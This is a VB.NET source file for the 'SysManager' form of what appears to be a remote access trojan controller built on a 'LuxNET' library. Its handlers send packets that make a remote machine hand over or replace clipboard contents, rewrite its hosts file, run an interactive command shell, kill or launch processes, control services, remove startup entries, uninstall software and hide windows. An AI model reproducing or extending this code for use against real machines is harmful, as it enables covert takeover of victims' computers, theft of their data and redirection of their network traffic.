Imports ComponentOwl.BetterListView
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports LuxNET.LuxNET
Public Class SysManager
    Inherits Form
    ' Methods
    Public Sub New()
        Me.packer = New Pack
        Me.InitializeComponent()
    End Sub

    Private Sub btn_getclipboard_Click(sender As Object, e As EventArgs) Handles btn_getclipboard.Click
        Me.SendPacket(New Object() {CByte(47)})
    End Sub

    Private Sub btn_loadhosts_Click(sender As Object, e As EventArgs) Handles btn_loadhosts.Click
        Me.SendPacket(New Object() {CByte(49)})
    End Sub

    Private Sub btn_savehosts_Click(sender As Object, e As EventArgs) Handles btn_savehosts.Click
        Me.SendPacket(New Object() {CByte(50), Me.rtb_hostsfile.Text})
    End Sub

    Private Sub btn_setclipboard_Click(sender As Object, e As EventArgs) Handles btn_setclipboard.Click
        Me.SendPacket(New Object() {CByte(48), Me.rtb_clipboard.Text})
    End Sub

    Private Sub btn_startcmd_Click(sender As Object, e As EventArgs) Handles btn_startcmd.Click
        Me.SendPacket(New Object() {CByte(44)})
        Me.btn_startcmd.Enabled = False
        Me.btn_stopcmd.Enabled = True
    End Sub

    Private Sub btn_stopcmd_Click(sender As Object, e As EventArgs) Handles btn_stopcmd.Click
        Me.SendPacket(New Object() {CByte(45)})
        Me.btn_startcmd.Enabled = True
        Me.btn_stopcmd.Enabled = False
        Me.rtb_cmd.Clear()
    End Sub

    Private Sub ChangeWindowCaptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChangeWindowCaptionToolStripMenuItem.Click
        Try
            Dim str As String = Interaction.InputBox("Please enter a new caption!", "Change Window Caption", "", -1, -1)
            If ((Not str Is Nothing) AndAlso (str.Length <> 0)) Then
                Me.SendPacket(New Object() {CByte(111), Conversions.ToInteger(Me.LV_Window.SelectedItems.Item(0).SubItems.Item(1).Text), str})
            End If
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        Try
            Me.SendPacket(New Object() {CByte(37), Me.LV_Service.SelectedItems.Item(0).Index})
        Catch exception1 As Exception
         
        End Try
    End Sub

    Private Sub ContinueToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ContinueToolStripMenuItem.Click
        Try
            Me.SendPacket(New Object() {CByte(38), Me.LV_Service.SelectedItems.Item(0).Index})
        Catch exception1 As Exception
           
        End Try
    End Sub

    Private Sub CreateNewProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreateNewProcessToolStripMenuItem.Click
        Try
            Me.SendPacket(New Object() {CByte(30), Interaction.InputBox("Please enter a valid new process name!", "New Process", "", -1, -1)})
        Catch exception1 As Exception
          
        End Try
    End Sub

    Private Sub ExecuteCommandToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExecuteCommandToolStripMenuItem.Click
        Try
            Dim str As String = Interaction.InputBox("Please enter the command you want to execute on the remote machines service!", "Execute Command", "", -1, -1)
            If ((Not str Is Nothing) AndAlso (str.Length <> 0)) Then
                Me.SendPacket(New Object() {CByte(43), Me.LV_Service.SelectedItems.Item(0).Index, Conversions.ToInteger(str)})
            End If
        Catch exception1 As Exception
            
        End Try
    End Sub

    Private Sub HideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem.Click
        Try
            Me.SendPacket(New Object() {CByte(112), Conversions.ToInteger(Me.LV_Window.SelectedItems.Item(0).SubItems.Item(1).Text)})
        Catch exception1 As Exception
           
        End Try
    End Sub

    Private Sub KillProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillProcessToolStripMenuItem.Click
        Try
            Me.SendPacket(New Object() {CByte(29), Conversions.ToInteger(Me.LV_Process.SelectedItems.Item(0).SubItems.Item(3).Text)})
        Catch exception1 As Exception
          
        End Try
    End Sub

    Private Sub MaximizeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MaximizeToolStripMenuItem.Click
        Try
            Me.SendPacket(New Object() {CByte(115), Conversions.ToInteger(Me.LV_Window.SelectedItems.Item(0).SubItems.Item(1).Text)})
        Catch exception1 As Exception
          
        End Try
    End Sub

    Private Sub MinimizeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MinimizeToolStripMenuItem.Click
        Try
            Me.SendPacket(New Object() {CByte(114), Conversions.ToInteger(Me.LV_Window.SelectedItems.Item(0).SubItems.Item(1).Text)})
        Catch exception1 As Exception
          
        End Try
    End Sub

    Private Sub PauseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PauseToolStripMenuItem.Click
        Try
            Me.SendPacket(New Object() {CByte(40), Me.LV_Service.SelectedItems.Item(0).Index})
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        Me.SendPacket(New Object() {CByte(28)})
    End Sub

    Private Sub RefreshToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem4.Click
        Me.SendPacket(New Object() {CByte(36)})
    End Sub

    Private Sub RefreshToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem2.Click
        Me.SendPacket(New Object() {CByte(33)})
    End Sub

    Private Sub RemoveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveToolStripMenuItem.Click
        Try
            Me.SendPacket(New Object() {CByte(35), Me.LV_Startup.SelectedItems.Item(0).Group.Header, Me.LV_Startup.SelectedItems.Item(0).Text, Me.LV_Startup.SelectedItems.Item(0).SubItems.Item(1).Text})
        Catch exception1 As Exception
           
        End Try
    End Sub

    Private Sub RestoreToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestoreToolStripMenuItem.Click
        Try
            Me.SendPacket(New Object() {CByte(116), Conversions.ToInteger(Me.LV_Window.SelectedItems.Item(0).SubItems.Item(1).Text)})
        Catch exception1 As Exception
           
        End Try
    End Sub
    Private Sub SendPacket(ByVal ParamArray args As Object())
        Dim data As Byte() = Me.packer.Serialize(args)
        Me.client.Send(data)
    End Sub

    Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
        Try
            Me.SendPacket(New Object() {CByte(113), Conversions.ToInteger(Me.LV_Window.SelectedItems.Item(0).SubItems.Item(1).Text)})
        Catch exception1 As Exception
           
        End Try
    End Sub

    Private Sub StartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartToolStripMenuItem.Click
        Try
            Me.SendPacket(New Object() {CByte(41), Me.LV_Service.SelectedItems.Item(0).Index})
        Catch exception1 As Exception
           
        End Try
    End Sub

    Private Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem.Click
        Try
            Me.SendPacket(New Object() {CByte(42), Me.LV_Service.SelectedItems.Item(0).Index})
        Catch exception1 As Exception
           
        End Try
    End Sub

    Private Sub SysManager_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.SendPacket(New Object() {CByte(27)})
    End Sub

    Private Sub tb_cmd_KeyDown(sender As Object, e As KeyEventArgs) Handles tb_cmd.KeyDown
        If (e.KeyCode = Keys.Enter) Then
            Me.SendPacket(New Object() {CByte(46), Me.tb_cmd.Text})
            Me.tb_cmd.Clear()
        End If
    End Sub

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        Me.SendPacket(New Object() {CByte(31)})
    End Sub

    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        Me.SendPacket(New Object() {CByte(33)})
    End Sub

    Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem3.Click
        Me.SendPacket(New Object() {CByte(34)})
    End Sub

    Private Sub ToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem4.Click
        Me.SendPacket(New Object() {CByte(36)})
    End Sub

    Private Sub TV_Information_AfterSelect(sender As Object, e As TreeViewEventArgs) Handles TV_Information.AfterSelect
        Me.TV_Information.SelectedNode.SelectedImageKey = Me.TV_Information.SelectedNode.ImageKey
    End Sub

    Private Sub UninstallNotSilentToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallNotSilentToolStripMenuItem.Click
        Try
            Me.SendPacket(New Object() {CByte(32), Me.LV_Software.SelectedItems.Item(0).Text})
        Catch exception1 As Exception
           
        End Try
    End Sub
    Public client As ServerClient
    Private packer As Pack

    ' Nested Types
    Public Enum PacketHeaders As Byte
        ' Fields
        ChangeWindowTitle = 111
        GetConnections = 33
        GetCP = 47
        GetInformation = 27
        GetProcess = 28
        GetServices = 36
        GetSoftware = 31
        GetStartup = 34
        HideWindow = 112
        KillProcess = 29
        LoadHostsFile = 49
        MaxmizeWindow = 115
        MinimizeWindow = 114
        NewProcess = 30
        RefreshWindow = 110
        RemoveStartup = 35
        RestoreWindow = 116
        SaveHostsFile = 50
        SendCMD = 46
        ServiceClose = 37
        ServiceContinue = 38
        ServiceExecuteCommand = 43
        ServicePause = 40
        ServiceRefresh = 40
        ServiceStart = 41
        ServiceStop = 42
        SetCP = 48
        ShowWindow = 113
        StartCMD = 44
        StopCMD = 45
        UninstallSoftware = 32
    End Enum

    Private Sub RefreshToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem1.Click
        Me.SendPacket(New Object() {CByte(31)})
    End Sub

    Private Sub RefreshToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem3.Click
        Me.SendPacket(New Object() {CByte(34)})
    End Sub

    Private Sub RefreshToolStripMenuItem6_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem6.Click
        Me.SendPacket(New Object() {CByte(110)})
    End Sub

    Private Sub RefreshToolStripMenuItem5_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem5.Click
        Try
            Me.SendPacket(New Object() {CByte(40), Me.LV_Service.SelectedItems.Item(0).Index})
        Catch exception1 As Exception

        End Try
    End Sub
End Class